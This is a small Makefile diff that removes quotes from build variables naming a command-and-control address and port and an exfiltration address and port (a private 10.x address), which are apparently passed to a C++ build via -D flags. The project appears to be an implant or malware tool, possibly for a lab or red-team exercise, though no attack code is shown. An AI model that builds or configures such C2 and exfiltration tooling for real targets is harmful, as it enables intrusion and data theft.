@@ -1,6 +1,7 @@
-C2_IP ?= "10.37.1.249"
+# IP addresses without quotes (the -D flag will add them)
+C2_IP ?= 10.37.1.249
 C2_PORT ?= 8888
-EXFIL_IP ?= "10.37.1.249"
+EXFIL_IP ?= 10.37.1.249
 EXFIL_PORT ?= 8889
 
 CXX = g++
